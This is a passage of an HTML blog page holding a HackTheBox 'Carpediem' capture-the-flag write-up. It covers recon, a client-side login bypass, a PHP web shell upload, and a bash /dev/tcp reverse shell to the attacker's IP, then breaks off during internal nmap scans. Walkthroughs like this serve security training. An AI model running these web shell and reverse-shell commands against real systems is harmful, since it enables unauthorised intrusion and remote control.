@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="MØstXeon">
+<meta name="description" content="false" />
+<meta name="keywords" content=", HackTheBox, Linux, Bruteforce, Virtual-Host-Enumeration, Gobuster, Insecure-Direct-Object-Reference, Burp-Suite, File-Upload, Docker, Mongodb, Mongosh, Static-Nmap, Full-TTY-Python, Port-Forwarding, Chisel, Zoiper, Clear-Text-Credentials, Backdrop, SSL-Sniffing, SSL-Decryption, Backdrop-RCE, Full-TTY-Script, CVE-2022-0492, Docker-Escape" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://mostxeon.github.io/posts/carpediem/" />
+
+
+    <title>
+        
+            Carpediem Write-Up :: MØst Xeon  — Simple Cyber Security Blog
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.653e12f307c49620b5b1ba68d8bf5a05c6ab0038af0589bca65686d5dbc02602.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Carpediem Write-Up">
+<meta itemprop="description" content="false"><meta itemprop="datePublished" content="2022-12-02T07:44:37+02:00" />
+<meta itemprop="dateModified" content="2022-12-02T07:44:37+02:00" />
+<meta itemprop="wordCount" content="3385">
+<meta itemprop="keywords" content="HackTheBox,Linux,Bruteforce,Virtual-Host-Enumeration,Gobuster,Insecure-Direct-Object-Reference,Burp-Suite,File-Upload,Docker,Mongodb,Mongosh,Static-Nmap,Full-TTY-Python,Port-Forwarding,Chisel,Zoiper,Clear-Text-Credentials,Backdrop,SSL-Sniffing,SSL-Decryption,Backdrop-RCE,Full-TTY-Script,CVE-2022-0492,Docker-Escape," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Carpediem Write-Up"/>
+<meta name="twitter:description" content="false"/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-12-02 07:44:37 &#43;0200 EET" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PQV7ZN74BD"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-PQV7ZN74BD', { 'anonymize_ip': false });
+}
+</script>
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">#</span>
+            <span class="logo__text">cd ~</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li>
+                <a href="/posts/">#ls posts</a><span class="logo__cursor" style="margin: 0"></span>
+            </li><li>
+                <a href="/tags/">#ls tags</a><span class="logo__cursor" style="margin: 0"></span>
+            </li><li>
+                <a href="/difficulty">#ls difficulty</a><span class="logo__cursor" style="margin: 0"></span>
+            </li><li>
+                <a href="/about">#whoami</a><span class="logo__cursor" style="margin: 0"></span>
+            </li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        16 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://mostxeon.github.io/posts/carpediem/">Carpediem Write-Up</a>
+      </h1>
+
+      
+
+      
+        <figure class="post-cover">
+          <img src="https://www.hackthebox.com/storage/avatars/8bd21b71341bdc7278443105bb09d033.png" alt="Carpediem Write-Up" />
+          
+          
+            <figcaption class="center">Machine created by 
+
+<a href="https://app.hackthebox.com/users/168546" target="_blank">ctrlzero</a> &amp; 
+
+<a href="https://app.hackthebox.com/users/114053" target="_blank">TheCyberGeek</a></figcaption>
+          
+        </figure>
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table of Contents</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#ininitial-recon">Ininitial Recon</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#surfin-the-webpage">Surfin The Webpage</a></li>
+        <li><a href="#sub-domain-enumeration">Sub-Domain Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#webserver-enumeration">Webserver Enumeration</a>
+      <ul>
+        <li><a href="#bypassing-login">Bypassing Login</a></li>
+      </ul>
+    </li>
+    <li><a href="#getting-rce">Getting RCE</a>
+      <ul>
+        <li><a href="#finding-upload-functionality">Finding Upload Functionality</a></li>
+        <li><a href="#uploading-php-file-and-getting-rce">Uploading PHP File And Getting RCE</a></li>
+      </ul>
+    </li>
+    <li><a href="#enumerating-in-docker">Enumerating In Docker</a>
+      <ul>
+        <li><a href="#scanning-other-hosts-using-static-nmap">Scanning Other Hosts Using Static Nmap</a></li>
+        <li><a href="#finding-an-open-mongodb-instance">Finding An Open Mongodb Instance</a></li>
+        <li><a href="#reading-important-information-from-mongodb">Reading Important Information From Mongodb</a></li>
+      </ul>
+    </li>
+    <li><a href="#getting-user-on-carpediem">Getting User On Carpediem</a>
+      <ul>
+        <li><a href="#using-zoiper-to-get-credentials">Using Zoiper To Get Credentials</a></li>
+        <li><a href="#checking-for-open-udp-port-5060-that-zoiper-uses">Checking For Open UDP Port 5060 That Zoiper Uses</a></li>
+        <li><a href="#hearing-the-message-and-getting-user">Hearing The Message And Getting User</a></li>
+      </ul>
+    </li>
+    <li><a href="#discovering-backdrop-instance">Discovering Backdrop Instance</a>
+      <ul>
+        <li><a href="#sniffing-traffic-going-to-backdrop">Sniffing Traffic Going To Backdrop</a></li>
+        <li><a href="#decrypting-ssl-traffic">Decrypting SSL Traffic</a></li>
+        <li><a href="#accessing-backdrop-from-kali">Accessing Backdrop From Kali</a></li>
+        <li><a href="#getting-rce-on-backdrop-container">Getting RCE On Backdrop Container</a></li>
+      </ul>
+    </li>
+    <li><a href="#escalating-to-root">Escalating To Root</a>
+      <ul>
+        <li><a href="#finding-cronjobs-executed-by-root">Finding Cronjobs Executed By Root</a></li>
+        <li><a href="#getting-root-inside-container">Getting Root Inside Container</a></li>
+        <li><a href="#listing-docker-capabilities">Listing Docker Capabilities</a></li>
+        <li><a href="#finding-cve-2022-0492-to-escape-docker">Finding CVE-2022-0492 To Escape Docker</a></li>
+        <li><a href="#getting-root-on-carpediem">Getting Root On Carpediem</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <h2 id="ininitial-recon">Ininitial Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Starting with a full tcp port scan, I got the following results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.167
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-02 07:41 EET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.167
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 962176f72dc5f04ee0a8dfb4d95e4526 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b16de3fada10b97b9e57535c5bb76006 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6a1696d80529d590bf6b2a0932dc364f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Comming Soon
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 427.09 seconds
+</span></span></code></pre></div><p>It looks like only ports <em>22 running ssh</em> and <em>80 running a webserver</em> are open.</p>
+<h3 id="surfin-the-webpage">Surfin The Webpage</h3>
+<p>The page on port <em>80</em> appears to be a static webpage that discloses the domain of <em>carpediem.htb</em>.</p>
+<p><img src="home_page.png" alt="Home Page"></p>
+<p>So, I&rsquo;ll add it to my <em>/etc/hosts</em>:</p>
+<p><code>echo -e '10.10.11.167\tcarpediem.htb' | sudo tee -a /etc/hosts</code></p>
+<h3 id="sub-domain-enumeration">Sub-Domain Enumeration</h3>
+<p>Since I have the main domain of the web server, I&rsquo;ll try to look for any hidden subdomains using gobuster:</p>
+<p><code>gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://carpediem.htb --append-domain</code></p>
+<p><img src="gobuster_vhost_bruteforce.png" alt="Gobuster Vhost Scann"></p>
+<p><em>portal.carpediem.htb</em> has been found, so I&rsquo;ll also add it to my <em>/etc/hosts</em>.</p>
+<p><code>echo -e '10.10.11.167\tportal.carpediem.htb' | sudo tee -a /etc/hosts</code></p>
+<h2 id="webserver-enumeration">Webserver Enumeration</h2>
+<p>The website on this new subdomain, appears to be a <em>Motorcycle Store</em>, having a <em>Login</em> and <em>Book this Bike</em> functionalities, however I need to be logged in order to book a bike.</p>
+<p><img src="clicking_on_bike.png" alt="Clicking On Bike"></p>
+<p><img src="seeing_book_this_bike_and_login.png" alt="Viewing Functionalities"></p>
+<p>I tried to bruteforce directories using <code>gobuster</code>, and this what I found:</p>
+<p><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://portal.carpediem.htb0</code>
+<img src="portal_gobuster_dir_bruteforce.png" alt="Gobuster Portal Directory Brutefoce"></p>
+<p>If I surf to the admin directory from firefox, I get redireted to the login page:</p>
+<p><img src="redirected_to_login.png" alt="Got redirected"></p>
+<h3 id="bypassing-login">Bypassing Login</h3>
+<p>But if I use <code>curl</code> with <code>-v</code> option to see the headers, I can see that the response is <em>200 ok</em>, and the presence of a <em>javascript</em> tag that displays the <em>login</em> page to me, and looks like the content of the admin page are being sent but aren&rsquo;t displayed because of these tags:</p>
+<p><code>curl http://portal.carpediem.htb/admin/ -v</code></p>
+<p><img src="noticing_script_tags.png" alt="Noticing Response and Script Tags"></p>
+<p>This means that if I remove these tags from the server&rsquo;s response, I can bypass this login mechanism and get to the admin page.
+So what I&rsquo;ll do is to intercept the response comming from the server using <em>Burp Suite</em> and make a rule to remove the tags before forwarding the response back to my firefox.</p>
+<p><img src="Clicking_add_rule_burp_suite.png" alt="Burp Suite"></p>
+<p><img src="adding_rule.png" alt="Adding Rule In Burp"></p>
+<p><img src="seeing_rule.png" alt="Seeing Rule"></p>
+<p><img src="forward_trafic_from_firefox.png" alt="Forwarding Traffic To Burp"></p>
+<p><img src="bypassed_login.png" alt="Bypassing Login"></p>
+<h2 id="getting-rce">Getting RCE</h2>
+<h3 id="finding-upload-functionality">Finding Upload Functionality</h3>
+<p>Cycling through the pages, I noticed that there is an <em>upload report</em> functionality, however it is in development:</p>
+<p><img src="noticing_upload_function.png" alt="Noticing Upload Functionality"></p>
+<p>But clicking on add then continue gives an error:</p>
+<p><img src="dev_error.png" alt="Dev Error"></p>
+<p>After inspecting the source code with <em>[CTRL + u]</em>, I saw a javascript upload function that appears to be uploading a file to <em>classes/Users.php?f=upload</em>:</p>
+<p><img src="javascript_upload_function.png" alt="Javascript Upload Function"></p>
+<p>If I try to access the url, an error like this will occur:</p>
+<p><img src="accessing_upload_url_get.png" alt="Accessing Upload URL"></p>
+<p>If I try to upload a file using <code>curl</code>, I will get an error about missing <em>file_upload</em> parameter, so after changing the parameter I can upload a php shell and get command execution:</p>
+<h3 id="uploading-php-file-and-getting-rce">Uploading PHP File And Getting RCE</h3>
+<p><img src="uploading_file_using_curl.png" alt="Uploading Shell.php"></p>
+<p><img src="getting_command_execution.png" alt="Getting Command Execution"></p>
+<p>Now, I can try to get a reverse shell back to my kali:</p>
+<pre tabindex="0"><code>$ echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]);?&gt;&#39; &gt; shell.php
+$ curl -XPOST http://portal.carpediem.htb/classes/Users.php?f=upload -F &#34;file_upload=@shell.php&#34;
+$ curl http://portal.carpediem.htb/uploads/1670042280_shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.23/1234%200%3E%261%27
+</code></pre><p><img src="getting_reverse_shell.png" alt="Getting Reverse Shell"></p>
+<h2 id="enumerating-in-docker">Enumerating In Docker</h2>
+<h3 id="scanning-other-hosts-using-static-nmap">Scanning Other Hosts Using Static Nmap</h3>
+<p>But it looks like I am in a docker container now, and it appears from reading the <em>/etc/hosts</em> file that there are more than one container.</p>
+<p>So I&rsquo;ll upload a static <code>nmap</code> binary, and try to scan a range of ip addresses to see who is up and what services are running on each container:</p>
+<ul>
+<li>You can either compile your version of <em>nmap</em> or try to find it online. I found one in this 
+
+<a href="https://github.com/ernw/static-toolbox" target="_blank"><em>repo</em></a>: <em>
+
+<a href="https://github.com/ernw/static-toolbox/releases/download/nmap-v7.91SVN/nmap-7.91SVN-x86_64-portable.zip" target="_blank">https://github.com/ernw/static-toolbox/releases/download/nmap-v7.91SVN/nmap-7.91SVN-x86_64-portable.zip</a></em>.</li>
+<li>First I&rsquo;ll get a fully interactive shell using
+<pre tabindex="0"><code>$ python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+$ [CTRL + z]
+$ stty raw -echo fg
+$ [Enter]
+</code></pre><img src="getting_fully_interactive_shell.png" alt="Getting Fully Interactive Shell"></li>
+</ul>
+<p>In order for nmap to work properly with all the scripts and everything, I need to also upload the directory containing nmap scripts:</p>
+<p><img src="uploading_nmap.png" alt="Uploading Nmap"></p>
+<p>Now when I need to run <code>nmap</code>, I need to specify the data diretory where the scripts are located. Here I&rsquo;ll scan the subnet <em>172.17.0.0/28</em> which ranges from <em>172.17.0.1</em> to <em>172.17.0.16</em> since my guest is that there is no more than 16 docker container on such a box:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@3c371615b7aa:/tmp$ chmod +x nmap
+</span></span><span style="display:flex;"><span>www-data@3c371615b7aa:/tmp$ ./nmap -A -p- --datadir data 172.17.0.0/28
+</span></span><span style="display:flex;"><span>Starting Nmap 7.91SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-03 10:54 UTC
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 172.17.0.1
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.000097s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 96:21:76:f7:2d:c5:f0:4e:e0:a8:df:b4:d9:5e:45:26 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b1:6d:e3:fa:da:10:b9:7b:9e:57:53:5c:5b:b7:60:06 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 6a:16:96:d8:05:29:d5:90:bf:6b:2a:09:32:dc:36:4f <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Comming Soon
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 172.17.0.2
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00041s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>21/tcp  open  ftp      vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to 172.17.0.6
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>80/tcp  open  http     Apache httpd 2.4.48 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.48 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http Apache httpd 2.4.48 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-generator: Backdrop CMS <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>https://backdropcms.org<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">22</span> disallowed entries <span style="color:#f92672">(</span><span style="color:#ae81ff">15</span> shown<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| /core/ /profiles/ /README.md /web.config /admin 
+</span></span><span style="display:flex;"><span>| /comment/reply /filter/tips /node/add /search /user/register 
+</span></span><span style="display:flex;"><span>|_/user/password /user/login /user/logout /?q<span style="color:#f92672">=</span>admin /?q<span style="color:#f92672">=</span>comment/reply
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.48 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Home | backdrop.carpediem.htb
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>backdrop.carpediem.htb/organizationName<span style="color:#f92672">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style="color:#f92672">=</span>Some-State/countryName<span style="color:#f92672">=</span>US
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-04-07T17:12:51
+</span></span><span style="display:flex;"><span>|_Not valid after:  2025-01-02T17:12:51
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>Service Info: OS: Unix
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 172.17.0.3
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00039s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>27017/tcp open  mongodb MongoDB 5.0.6
+</span></span><span style="display:flex;"><span>| mongodb-databases: 
+</span></span><span style="display:flex;"><span>|   ok <span style="color:#f92672">=</span> 1.0
+</span></span><span style="display:flex;"><span>|   totalSizeMb <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|   databases
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> admin
+</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
+</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">135168</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> trudesk
+</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
+</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">1118208</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> local
+</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
+</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">90112</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>|       name <span style="color:#f92672">=</span> config
+</span></span><span style="display:flex;"><span>|       empty <span style="color:#f92672">=</span> false
+</span></span><span style="display:flex;"><span>|       sizeOnDisk <span style="color:#f92672">=</span> <span style="color:#ae81ff">36864</span>
+</span></span><span style="display:flex;"><span>|_  totalSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">1380352</span>
+</span></span><span style="display:flex;"><span>|_mongodb-info: ERROR: Script execution failed <span style="color:#f92672">(</span>use -d to debug<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> mysql <span style="color:#f92672">(</span>172.17.0.4<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.000088s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>3306/tcp  open  mysql   MySQL 8.0.27
+</span></span><span style="display:flex;"><span>| mysql-info: 
+</span></span><span style="display:flex;"><span>|   Protocol: <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>|   Version: 8.0.27
+</span></span><span style="display:flex;"><span>|   Thread ID: <span style="color:#ae81ff">874</span>
+</span></span><span style="display:flex;"><span>|   Capabilities flags: <span style="color:#ae81ff">65535</span>
+</span></span><span style="display:flex;"><span>|   Some Capabilities: Speaks41ProtocolOld, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsTransactions, SupportsCompression, ODBCClient, IgnoreSigpipes, ConnectWithDatabase, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, DontAllowDatabaseTableColumn, LongPassword, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+</span></span><span style="display:flex;"><span>|   Status: Autocommit
+</span></span><span style="display:flex;"><span>|   Salt: 4|OQ1<span style="color:#f92672">(</span>	:<span style="color:#f92672">]</span>dgo1COl<span style="color:#ae81ff">\x</span>1E~<span style="color:#ae81ff">\x</span>16N
+</span></span><span style="display:flex;"><span>|_  Auth Plugin Name: caching_sha2_password
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>MySQL_Server_8.0.27_Auto_Generated_Server_Certificate
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-10-27T03:20:43
+</span></span><span style="display:flex;"><span>|_Not valid after:  2031-10-25T03:20:43
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>33060/tcp open  mysqlx?
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+</span></span><span style="display:flex;"><span>|     Invalid message<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HY000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   LDAPBindReq: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     *Parse error unserializing protobuf message&#34;</span>
+</span></span><span style="display:flex;"><span>|     HY000
+</span></span><span style="display:flex;"><span>|   oracle-tns: 
+</span></span><span style="display:flex;"><span>|     Invalid message-frame.<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    HY000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port33060-TCP:V=7.91SVN%I=7%D=12/3%Time=638B2B0C%P=x86_64-pc-linux-musl
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:%r(NULL,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\x</span>0b<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;)%r(GenericLines,9,&#34;</span><span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\0\0\0\
